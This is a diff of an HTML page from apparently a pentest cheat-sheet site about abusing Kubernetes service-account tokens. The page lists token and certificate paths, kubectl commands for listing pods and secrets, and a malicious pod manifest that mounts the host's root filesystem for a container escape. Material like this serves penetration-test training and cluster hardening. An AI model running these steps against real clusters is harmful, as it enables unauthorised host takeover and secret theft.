@@ -191,75 +191,199 @@
   <li><a href="https://tldrbins.github.io/@privesc/">Privesc</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="token-location">Token Location</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/run/secrets/kubernetes.io/serviceaccount/token
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/run/secrets/kubernetes.io/serviceaccount/token
+</span></span></span></code></pre></div></div>
 <h3 id="certificate-location">Certificate Location</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/run/secrets/kubernetes.io/serviceaccount/ca.crt
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/run/secrets/kubernetes.io/serviceaccount/ca.crt
+</span></span></span></code></pre></div></div>
 <h3 id="basic-commands">Basic Commands</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all namespaces</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get user permissions in current namespace</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get user permissions in specific namespace</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all pods</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods --all-namespaces
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List pods in specific namespace</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get YAML of a pod</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get pod &lt;POD_NAME&gt; -o yaml
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get info of a pod</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 describe pod &lt;POD_NAME&gt; -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List secrets</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get secrets -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get info of a secret</span>
-</span></span><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 describe secret &lt;secret_name&gt; -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List all namespaces
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; get namespaces
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get user permissions in current namespace
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; auth can-i --list
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get user permissions in specific namespace
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; auth can-i --list -n &lt;NAMESPACE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List all pods
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; get pods --all-namespaces
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List pods in specific namespace
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; get pods -n &lt;NAMESPACE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get YAML of a pod
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; get pod &lt;POD_NAME&gt; -o yaml
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get info of a pod
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; describe pod &lt;POD_NAME&gt; -n &lt;NAMESPACE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List secrets
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; get secrets -n &lt;NAMESPACE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get info of a secret
+</span></span><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; describe secret &lt;SECRET_NAME&gt; -n &lt;NAMESPACE&gt;
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">kubectl</a></em></small></p>
 <br>
 <hr>
 <h3 id="abuse-1-mount-hosts-file-system">Abuse #1: Mount host&rsquo;s file system</h3>
 <h4 id="1-create-a-malicious-yaml-template">1. Create a Malicious YAML (Template)</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1 </span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">alpine</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;NAMESPACE_NAME&gt;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;IMAGE_NAME&gt;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">]</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;sleep 300000&#34;</span><span class="p">]</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w"> 
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/mnt</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostfs</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostfs</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">  
-</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">automountServiceAccountToken</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">apiVersion: v1 
+</span></span></span><span class="line"><span class="cl"><span class="go">kind: Pod
+</span></span></span><span class="line"><span class="cl"><span class="go">metadata:
+</span></span></span><span class="line"><span class="cl"><span class="go">  name: alpine
+</span></span></span><span class="line"><span class="cl"><span class="go">  namespace: &lt;NAMESPACE_NAME&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">spec:
+</span></span></span><span class="line"><span class="cl"><span class="go">  containers:
+</span></span></span><span class="line"><span class="cl"><span class="go">  - name: test
+</span></span></span><span class="line"><span class="cl"><span class="go">    image: &lt;IMAGE_NAME&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">    command: [&#34;/bin/sh&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="go">    args: [&#34;-c&#34;, &#34;sleep 300000&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="go">    volumeMounts: 
+</span></span></span><span class="line"><span class="cl"><span class="go">    - mountPath: /mnt
+</span></span></span><span class="line"><span class="cl"><span class="go">      name: hostfs
+</span></span></span><span class="line"><span class="cl"><span class="go">  volumes:
+</span></span></span><span class="line"><span class="cl"><span class="go">  - name: hostfs
+</span></span></span><span class="line"><span class="cl"><span class="go">    hostPath:  
+</span></span></span><span class="line"><span class="cl"><span class="go">      path: /
+</span></span></span><span class="line"><span class="cl"><span class="go">  automountServiceAccountToken: true
+</span></span></span><span class="line"><span class="cl"><span class="go">  hostNetwork: true
 </span></span></span></code></pre></div></div>
 <h4 id="2-create-a-new-pod">2. Create a new pod</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 apply -f test.yaml
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; apply -f test.yaml
+</span></span></span></code></pre></div></div>
 <h4 id="3-execute">3. Execute</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 <span class="nb">exec</span> <span class="nb">test</span> --stdin --tty -n &lt;NAMESPACE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check host filesystem</span>
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /mnt/root/
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kubectl --token &lt;TOKEN&gt; --certificate-authority ca.crt --server &lt;TARGET&gt; exec test --stdin --tty -n &lt;NAMESPACE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check host filesystem
+</span></span><span class="line"><span class="cl"><span class="go">cd /mnt/root/
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
